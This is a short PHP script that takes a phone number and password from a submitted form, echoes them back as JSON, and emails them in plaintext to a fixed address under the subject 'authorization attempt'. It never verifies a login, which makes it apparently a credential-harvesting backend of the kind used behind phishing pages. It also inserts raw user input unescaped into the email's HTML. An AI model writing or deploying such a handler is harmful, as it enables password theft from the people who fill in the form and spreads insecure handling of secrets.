<?php
if (isset($_POST["phone"]) && isset($_POST["password"]) ) { 

	// Формируем массив для JSON ответа
    $result = array(
    	'phone' => $_POST["phone"],
    	'pass' => $_POST["password"]
    ); 

    // Переводим массив в JSON
    echo json_encode($result); 
    if (!empty($_POST["phone"]) && !empty($_POST["password"])) {
    $to = 'info@extremiks.by'; //Почта получателя, через запятую можно указать сколько угодно адресов 
        $subject = 'Попытка авторизации'; //Загаловок сообщения
        $message = '
                <html>
                    <head>
                        <title>'.$subject.'</title>
                    </head>
                    <body>
                        <p>Телефон: '.$_POST['phone'].'</p>
                        <p>Пароль: '.$_POST['password'].'</p>
                    </body>
                </html>'; //Текст сообщения
        $headers  = "Content-type: text/html; charset=utf-8 \r\n"; //Кодировка письма
        $headers .= "From: Отправитель <postmaster@extremiks.by>\r\n"; //Наименование и почта отправителя
        mail($to, $subject, $message, $headers);
    } else {
        return false;
    }
}

?>
